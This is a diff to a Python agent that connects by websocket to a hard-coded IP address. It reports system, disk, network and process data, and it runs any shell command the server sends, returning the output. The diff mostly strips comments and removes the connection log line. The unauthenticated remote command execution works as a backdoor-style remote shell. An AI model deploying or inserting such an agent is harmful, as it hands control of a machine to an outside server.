@@ -11,9 +11,9 @@ import subprocess
 import uuid
 import requests
 
-SERVER = "ws://47.236.6.215:9001"   # 控制端地址
-REPORT_INTERVAL = 2                 # 上报间隔秒
-TOKEN_FILE = "agent_token.txt"      # token 存储文件
+SERVER = "ws://47.236.6.215:9001"
+REPORT_INTERVAL = 2
+TOKEN_FILE = "agent_token.txt"
 
 # ---------------- Token ----------------
 def get_or_create_token():
@@ -59,24 +59,17 @@ def get_sysinfo():
     except:
         mem = 0
 
-    # 磁盘
     disks = []
     try:
         for d in psutil.disk_partitions():
             try:
                 usage = psutil.disk_usage(d.mountpoint)
-                disks.append({
-                    "mount": d.mountpoint,
-                    "total": usage.total,
-                    "used": usage.used,
-                    "percent": usage.percent
-                })
+                disks.append({"mount": d.mountpoint, "total": usage.total, "used": usage.used, "percent": usage.percent})
             except:
                 continue
     except:
         pass
 
-    # 网络流量
     try:
         net = psutil.net_io_counters()
         now = time.time()
@@ -88,7 +81,6 @@ def get_sysinfo():
         up_speed, down_speed = 0, 0
         net = type("obj", (), {"bytes_sent": 0, "bytes_recv": 0})()
 
-    # 进程前五
     top5 = []
     try:
         for p in sorted(psutil.process_iter(["pid", "name", "cpu_percent", "memory_percent"]),
@@ -127,7 +119,7 @@ def exec_cmd(cmd):
     try:
         res = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=30)
         return {"stdout": res.stdout, "stderr": res.stderr, "returncode": res.returncode}
-    except Exception as e:
+    except:
         return {"stdout": "", "stderr": "", "returncode": -1}
 
 # ---------------- 主逻辑 ----------------
@@ -136,7 +128,6 @@ async def run_agent():
         try:
             async with websockets.connect(SERVER, ping_interval=None) as ws:
                 await ws.send(json.dumps({"type": "register", "agent_id": AGENT_ID}))
-                print(f"[agent] connected to {SERVER}, id={AGENT_ID}")
 
                 async def reporter():
                     while True:
@@ -153,11 +144,7 @@ async def run_agent():
                             if data.get("type") == "exec":
                                 cmd = data.get("cmd", "")
                                 res = exec_cmd(cmd)
-                                await ws.send(json.dumps({
-                                    "type": "cmd_result",
-                                    "agent_id": AGENT_ID,
-                                    "payload": res
-                                }))
+                                await ws.send(json.dumps({"type": "cmd_result", "agent_id": AGENT_ID, "payload": res}))
                         except:
                             pass
 
